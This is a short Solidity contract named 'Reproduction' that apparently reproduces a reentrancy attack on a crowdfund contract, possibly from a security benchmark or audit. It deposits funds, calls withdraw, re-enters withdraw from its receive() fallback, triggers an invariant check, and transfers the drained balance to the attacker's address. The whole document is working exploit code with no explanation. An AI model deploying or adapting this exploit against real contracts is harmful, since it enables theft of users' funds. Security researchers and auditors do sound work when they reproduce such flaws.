pragma solidity >=0.8.2;

interface ICrowdfund {
    function donate() external payable;
    function withdraw() external;
    function reclaim() external;
    function invstore() external;
    function invariant(uint choice) external;
}

contract Reproduction {
    ICrowdfund public target;
    address public attacker;
    bool public reentered;

    constructor(address _target) {
        target = ICrowdfund(_target);
        attacker = msg.sender;
    }

    function setup() external payable {
        target.donate{value: msg.value}();
    }

    function startExploit() external {
        target.invstore(); 
        target.withdraw();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.withdraw(); 
        }
    }

    function finalizeExploit() external {
        target.invariant(0); 
    }

    function drainFunds() external {
        payable(attacker).transfer(address(this).balance);
    }
}